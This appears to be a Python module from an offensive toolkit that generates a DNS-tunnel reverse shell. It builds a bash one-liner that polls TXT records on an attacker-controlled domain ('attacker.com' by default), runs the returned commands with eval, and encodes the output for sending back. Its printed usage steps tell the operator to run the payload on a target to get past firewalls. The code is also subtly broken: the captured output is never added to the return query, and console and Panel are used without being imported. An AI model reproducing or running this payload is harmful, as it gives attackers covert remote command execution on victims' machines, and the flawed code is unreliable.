# /root/lazy1/modules/payloads/reverse/network/dns_reverse.py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

MODULE_INFO = {
    "name": "DNS Reverse Shell",
    "description": "DNS tunnel reverse shell for bypassing network restrictions",
    "author": "LazyFramework Team",
    "license": "MIT",
    "platform": "Linux",
    "arch": "x86/x64",
    "rank": "Normal",
    "dependencies": []
}

OPTIONS = {
    "domain": {
        "description": "Domain name for DNS exfiltration",
        "required": True,
        "default": "attacker.com"
    },
    "delay": {
        "description": "Delay between queries (seconds)",
        "required": False,
        "default": "5"
    }
}

def generate_dns_reverse(domain, delay="5"):
    """Generate DNS reverse shell"""
    
    return f"bash -c 'while true; do cmd=$(dig +short TXT cmd.{domain} | tr -d \"\\\"\"); if [ ! -z \"$cmd\" ]; then result=$(eval \"$cmd\" 2>&1 | base64 -w0); dig +short TXT {domain} >/dev/null 2>&1; fi; sleep {delay}; done'"

def run(session, options):
    domain = options.get("domain", "attacker.com")
    delay = options.get("delay", "5")
    
    console.print("\n[bold green]🌐 DNS Reverse Shell[/bold green]")
    console.print("=" * 50)
    
    payload = generate_dns_reverse(domain, delay)
    
    console.print(f"\n[bold]Protocol:[/bold] DNS")
    console.print(f"[bold]Domain:[/bold] {domain}")
    console.print(f"[bold]Delay:[/bold] {delay} seconds")
    console.print(f"[bold]Use Case:[/bold] Bypass firewall through DNS")
    
    console.print(f"\n[bold yellow]📦 Payload:[/bold yellow]")
    console.print(Panel(payload, border_style="magenta"))
    
    console.print(f"\n[bold green]🚀 Usage:[/bold green]")
    console.print("1. Set up DNS server with command injection")
    console.print("2. Execute payload on target")
    console.print("3. Commands via TXT records, results via queries")
    
    console.print(f"\n[bold red]⚠️  Note:[/bold red] Requires DNS server setup and domain control")
    
    return payload
